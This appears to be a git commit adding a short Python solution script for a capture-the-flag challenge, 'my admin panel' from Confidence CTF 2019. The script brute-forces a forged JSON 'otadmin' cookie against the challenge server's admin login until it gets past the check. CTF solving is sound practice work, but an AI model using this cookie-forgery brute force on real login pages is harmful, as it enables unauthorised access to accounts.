a2294ccf4ecc64a4d42015f15d64ea78d971580b
nannany <ymym1990ymym@gmail.com>
2019-03-21 14:39:28 +0900

    ctf

---
+++ src/ctf/ConfidenceCTF2019/my_admin_panel.py
@@ -0,0 +1,9 @@
+    import requests
+
+url = 'https://gameserver.zajebistyc.tf/admin/login.php'
+s = requests.Session()
+for i in range(1000):
+    r = s.get(url, cookies={'otadmin': '{"hash": ' + str(i) + '}'})
+    if 'HINT' not in str(r.content):
+        print(str(r.content))
+        break
